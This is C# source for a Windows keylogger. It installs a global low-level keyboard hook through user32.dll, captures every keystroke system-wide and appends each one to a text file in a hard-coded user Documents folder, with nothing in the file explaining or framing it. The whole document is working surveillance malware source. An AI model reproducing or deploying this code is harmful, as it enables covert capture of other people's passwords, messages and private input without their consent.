using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace Keys
{
    internal class Program
    {
        private static int WH_KEYWORD_LL = 13;
        private static int WH_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc lowLevelKeyboard = HookCallBack;

        static void Main(string[] args)
        {
            hook = SetHook(lowLevelKeyboard);
            Application.Run();
            UnhookWindowsHookEx(hook);

        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            using (StreamWriter writer = new StreamWriter(@"C:\Users\shako\OneDrive\Documents\Keys.txt", true))
            {
                if (nCode >= 0 && wParam == (IntPtr)WH_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (((System.Windows.Forms.Keys)vkCode).ToString() == "OemPeriod")
                    {
                        Console.Out.Write(".");
                        WriteInFile(writer, ".");
                    }
                    else if (((System.Windows.Forms.Keys)vkCode).ToString() == "Oemcomma")
                    {
                        Console.Out.Write(",");
                        WriteInFile(writer, ",");
                    }
                    else if (((System.Windows.Forms.Keys)vkCode).ToString() == "Space")
                    {
                        Console.Out.Write(" ");
                        WriteInFile(writer, " ");
                    }
                    else
                    {
                        Console.Out.Write((System.Windows.Forms.Keys)vkCode);
                        WriteInFile(writer ,(System.Windows.Forms.Keys)vkCode);
                    }
                }
                return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYWORD_LL, lowLevelKeyboard, moduleHandle, 0);
        }

        private static void WriteInFile(StreamWriter writer, dynamic character)
        {
            writer.Write(character);
            writer.Close();
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String moduleName);
    }
}
